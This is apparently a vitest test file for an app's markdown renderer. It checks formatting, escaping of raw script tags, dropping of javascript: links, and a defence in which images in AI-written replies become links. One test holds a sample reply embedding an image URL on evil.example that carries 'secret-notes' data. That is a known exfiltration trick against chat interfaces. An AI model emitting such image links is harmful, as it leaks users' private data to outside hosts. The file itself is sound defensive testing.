import { describe, expect, it } from "vitest";
import { renderMarkdown, slugify, tableCells, wikilinks, type MarkdownOptions } from "./markdown";

describe("renderMarkdown as notes, journal and projects use it", () => {
  it("keeps line breaks inside a paragraph and shifts headings below the screen title", () => {
    expect(renderMarkdown("# Plan\nline one\nline two")).toBe("<h3>Plan</h3>\n<p>line one<br/>line two</p>");
  });

  it("escapes raw HTML", () => {
    expect(renderMarkdown("<script>alert(1)</script>")).toBe("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
  });

  it("renders bold, italics and inline code", () => {
    expect(renderMarkdown("**a** *b* `c*d*`")).toBe("<p><strong>a</strong> <em>b</em> <code>c*d*</code></p>");
  });

  it("opens web links in a new tab and drops unsafe ones to their text", () => {
    expect(renderMarkdown("[x](https://e.com/a_b)")).toBe('<p><a href="https://e.com/a_b" target="_blank" rel="noreferrer">x</a></p>');
    expect(renderMarkdown("[x](javascript:alert(1))")).not.toContain("<a");
  });

  it("renders flat lists and fenced code", () => {
    expect(renderMarkdown("- a\n- b\n\n1. one\n2. two")).toBe("<ul><li>a</li><li>b</li></ul>\n<ol><li>one</li><li>two</li></ol>");
    expect(renderMarkdown("```sh\necho <hi>\n```")).toBe('<pre><code data-lang="sh">echo &lt;hi&gt;</code></pre>');
  });

  it("ends a paragraph at a list", () => {
    expect(renderMarkdown("Steps:\n- one")).toBe("<p>Steps:</p>\n<ul><li>one</li></ul>");
  });
});

describe("renderMarkdown for documents", () => {
  const doc = (s: string, o: MarkdownOptions = {}) => renderMarkdown(s, { breaks: false, headingShift: 1, anchors: true, ...o });

  it("joins wrapped lines and breaks only on two trailing spaces", () => {
    expect(doc("one\ntwo  \nthree")).toBe("<p>one two<br/>three</p>");
  });

  it("gives headings ids, unique within the page", () => {
    expect(doc("# Combat Loop\n## Combat Loop")).toBe('<h2 id="h-combat-loop">Combat Loop</h2>\n<h3 id="h-combat-loop-1">Combat Loop</h3>');
  });

  it("renders tables with alignment, escaped pipes and code", () => {
    const html = doc("| Name | Cost |\n| :--- | ---: |\n| Sword \\| big | `a\\|b` |\n| Bow | 3 |");
    expect(html).toContain("<thead><tr><th style=\"text-align:left\">Name</th><th style=\"text-align:right\">Cost</th></tr></thead>");
    expect(html).toContain("<td style=\"text-align:left\">Sword | big</td><td style=\"text-align:right\"><code>a|b</code></td>");
    expect(html).toContain("<td style=\"text-align:left\">Bow</td>");
  });

  it("does not take a rule under a line of text for a table", () => {
    expect(doc("a | b\n---")).toBe("<p>a | b</p>\n<hr/>");
  });

  it("renders fences of four backticks and tildes, keeping inner fences", () => {
    expect(doc("````md\n```js\nx\n```\n````")).toBe('<pre><code data-lang="md">```js\nx\n```</code></pre>');
    expect(doc("~~~\ny\n~~~")).toBe("<pre><code>y</code></pre>");
  });

  it("renders block quotes with blocks inside", () => {
    expect(doc("> **Note**\n>\n> - a\n> - b")).toBe("<blockquote><p><strong>Note</strong></p>\n<ul><li>a</li><li>b</li></ul></blockquote>");
  });

  it("nests lists by indentation", () => {
    expect(doc("- a\n  - b\n    - c\n- d")).toBe("<ul><li>a<ul><li>b<ul><li>c</li></ul></li></ul></li><li>d</li></ul>");
    expect(doc("1. one\n   - x\n2. two")).toBe("<ol><li>one<ul><li>x</li></ul></li><li>two</li></ol>");
    expect(doc("3. three\n4. four")).toBe('<ol start="3"><li>three</li><li>four</li></ol>');
  });

  it("keeps a list going across a blank line and an indented paragraph", () => {
    expect(doc("- a\n\n  more\n- b")).toBe("<ul><li>a<p>more</p></li><li>b</li></ul>");
  });

  it("renders task lists", () => {
    expect(doc("- [x] done\n- [ ] open")).toBe('<ul><li class="task"><input type="checkbox" disabled checked/> done</li><li class="task"><input type="checkbox" disabled/> open</li></ul>');
  });

  it("renders images, rules and strikethrough", () => {
    expect(doc("![map](https://e.com/m.png)", { loadImage: () => true })).toBe('<p><img src="https://e.com/m.png" alt="map" loading="lazy"/></p>');
    expect(doc("---")).toBe("<hr/>");
    expect(doc("~~old~~")).toBe("<p><del>old</del></p>");
  });

  it("keeps app links in the same window", () => {
    expect(doc("[Combat](everythingapp://wiki?id=repo%3AD%3Aa.md)")).toBe('<p><a href="everythingapp://wiki?id=repo%3AD%3Aa.md">Combat</a></p>');
  });

  it("lets the caller place links and images", () => {
    const html = renderMarkdown("![x](/wiki/media/1/a.png) [y](#top)", { url: (h) => (h.startsWith("/") ? `https://hub${h}?token=t` : h), loadImage: (u) => u.startsWith("https://hub/") });
    expect(html).toBe('<p><img src="https://hub/wiki/media/1/a.png?token=t" alt="x" loading="lazy"/> <a href="#top">y</a></p>');
  });

  it("autolinks bare and bracketed web addresses", () => {
    expect(doc("see https://e.com/x.")).toBe('<p>see <a href="https://e.com/x" target="_blank" rel="noreferrer">https://e.com/x</a>.</p>');
    expect(doc("<https://e.com>")).toBe('<p><a href="https://e.com" target="_blank" rel="noreferrer">https://e.com</a></p>');
  });

  it("leaves snake_case words alone", () => {
    expect(doc("call max_hit_points now")).toBe("<p>call max_hit_points now</p>");
  });
});

describe("helpers", () => {
  it("splits table cells on unescaped pipes outside code", () => {
    expect(tableCells("| a | b \\| c | `d|e` |")).toEqual(["a", "b \\| c", "`d|e`"]);
  });

  it("slugs headings like GitHub", () => {
    expect(slugify("Combat: The Loop (v2)")).toBe("combat-the-loop-v2");
  });

  it("finds wikilinks", () => {
    expect(wikilinks("[[A]] and [[B|alias]] and [[C#h]]")).toEqual(["A", "B", "C"]);
  });
});

describe("pictures in text a model wrote", () => {
  it("become links to open, so showing a reply sends nothing anywhere", () => {
    const reply = "Here it is ![chart](https://evil.example/p.png?d=secret-notes)";
    const linked = renderMarkdown(reply, { images: "link" });
    expect(linked).not.toContain("<img");
    expect(linked).toContain('<a href="https://evil.example/p.png?d=secret-notes" target="_blank" rel="noreferrer"');
    expect(linked).toContain(">chart</a>");
    expect(renderMarkdown("![](https://x.example/a.png)", { images: "link" })).toContain(">Picture</a>");
    // Notes, the journal and wiki pages load no picture from another site either: each is a link to open.
    expect(renderMarkdown(reply)).not.toContain("<img");
    expect(renderMarkdown(reply)).toContain('title="A picture, not loaded until you open it">chart</a>');
    expect(renderMarkdown(reply, { loadImage: (u) => u.startsWith("https://hub.example/wiki/media/") })).not.toContain("<img");
    expect(renderMarkdown("![a](https://hub.example/wiki/media/1/a.png)", { loadImage: (u) => u.startsWith("https://hub.example/wiki/media/") })).toContain('<img src="https://hub.example/wiki/media/1/a.png"');
  });
});
